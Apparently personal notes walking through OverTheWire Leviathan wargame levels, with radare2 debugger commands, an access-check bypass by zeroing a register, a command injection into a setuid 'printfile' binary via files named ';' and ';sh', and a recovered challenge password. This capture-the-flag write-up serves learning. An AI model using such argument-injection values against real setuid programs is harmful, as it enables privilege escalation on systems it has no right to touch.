# this part calls the `access` syscall and jumps if our user (leviathan2) has read access.
# this jump avoids a second jump that quits out. (with 'You cant have that file...')
# the second jump effectively prohibits us from making use of the setuid bit (leviathan3)

# for fun we can break just before the test and null out eax to force the first jump:
:db 0x0804858d
:dc
:dr eax = 0x0
:dc # let the rest play out.

# we get the following error message:
# /bin/cat: /etc/leviathan_pass/leviathan3: Permission denied
# so we got past the check but the actual cat command failed as well.

# reason: r2 runs as leviathan2 and the setuid on the binary itself won't help us.
# let's test that another way:
./printfile /etc/leviathan_pass/leviathan2 # perm denied.
r2 -Ad ./printfile /etc/leviathan_pass/leviathan2
:dc # yep, that one worked.

# we'll need to find another way. let's pick out some relevant lines:
0x08048585      e886feffff     call sym.imp.access         ; int access(const char *path, int mode)
0x080485b1      68d4860408     push str.bin_cat__s         ; 0x80486d4 ; "/bin/cat %s" # fstring.

                                                                          const char *format, ...)
0x080485ed      e8defdffff     call sym.imp.system         ; int system(const char *string)
# note that the fstring does not have quotes around %s.
# we need a string that makes it past the access syscall
# and that can simultaneously abuse the string that's
# passed to the system syscall.

# how about simply no file for cat?
~/printfile ';' # you cant have that file...
# makes sense it does not exist.

mkdir /tmp/ben && cd /tmp/ben
touch ; # whoops, can't do it this way.
touch ';' # yep.
ls # ;
# that really is a valid filename.

~/printfile ';' # suddenly we can type.
whoami # whoami
# so we're in cat now.
# if you give cat an empty file it'll
# just echo stdin back at you.
^d # exit cat.

touch ';sh'
ls # ;  ;sh

whoami # whoami, still in cat
^d # exit cat and we're greeted with a prompt.

Vpp
g main
B # break at main.
:dc # run to breakpoint.

# step over all that variable mangling.
# addresses of var_2bh and var_24h are pushed to the stack.
# strcmp is called from libc. strcmp compares last
# two things on the stack and returns 0 in eax if
# they were equal.

:afv # get addresses for variables
  # var int32_t var_2bh @ ebp-0x2b
  # var int32_t var_24h @ ebp-0x24

# there are the locations of our 2 variables.

# tell r2 to interpret them as C strings:
:afvt var_2bh char *
:afvt var_24h char *

# step to right before the strcmp.
:afvd
  # var var_24h = 0xffffd684 = "h0no33"
  # var var_2bh = 0xffffd67d = "kakaka"

# ...and that strcmp was not the one we we're looking for
# because we have not even entered our password yet.

# step a bit further and into the `do_stuff()` call.
# (I adore the naming convention.)

# step past the fgets call, enter any password (I chose AAAA)
# and stop before the strcmp call.
# same thing as above, pick out the two strings that are compared:

# one of those is familiar:
var var_113h = 0xffffd555 = "snlprintf\n"
var var_108h = 0xffffd560 = "AAAA\n"
